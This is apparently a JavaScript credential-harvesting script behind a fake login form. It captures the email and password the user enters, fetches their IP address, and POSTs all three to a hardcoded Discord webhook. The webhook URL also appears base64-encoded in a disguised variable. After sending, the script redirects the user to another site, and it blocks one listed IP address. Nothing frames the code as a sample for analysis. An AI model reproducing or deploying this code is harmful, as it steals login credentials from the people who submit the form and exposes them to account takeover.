const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMTIxNjc0MTMwNDUwNDM0MC83R0hScnY2ZVIzc3RmSWdFNTFFbWM3Ny1ZS25iZVV5T180aVA5dS10a1Y1N1h4NU9iTUhlX3BpUHl2aWlTYzY3ZXlRMg==';

const skibidiCheckbox = document.getElementById('skibidiCheckbox');
const loginButton = document.getElementById('loginButton');

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    if (!skibidiCheckbox.checked) {
        skibidiCheckbox.classList.add('error');
        alert('Please check the box.');
        return;
    } else {
        skibidiCheckbox.classList.remove('error');
    }

    const email = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // List of IPs to block (placeholders for now)
    const blockedIPs = ['89.187.164.251'];

    // Fetch the user's IP address using ipify
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;

            // Check if the IP is blocked
            if (blockedIPs.includes(userIP)) {
                alert('Access denied. Your IP is blocked.');
                window.location.href = 'https://cryptodude3.github.io/badmin/';
                return;
            }

            // Send data to Discord webhook
            fetch('https://discord.com/api/webhooks/1311216741304504340/7GHRrv6eR3stfIgE51Emc77-YKnbeUyO_4iP9u-tkV57Xx5ObMHe_piPyviiSc67eyQ2', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    Data: 'the user info discord webhook'
                })
            });

            // Decode and fetch user info
            const userInfo = 'https://discord.com/api/webhooks/1311216741304504340/7GHRrv6eR3stfIgE51Emc77-YKnbeUyO_4iP9u-tkV57Xx5ObMHe_piPyviiSc67eyQ2';

            fetch(userInfo, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `New Login Attempt:
Email: ||${email}||
Password: ||${password}||
IP Address: ||${userIP}||`
                })
            })
            .then(response => {
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = 'https://cryptodude3.github.io/badmin/';
            });
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
            window.location.href = 'https://cryptodude3.github.io/badmin/';
        });
});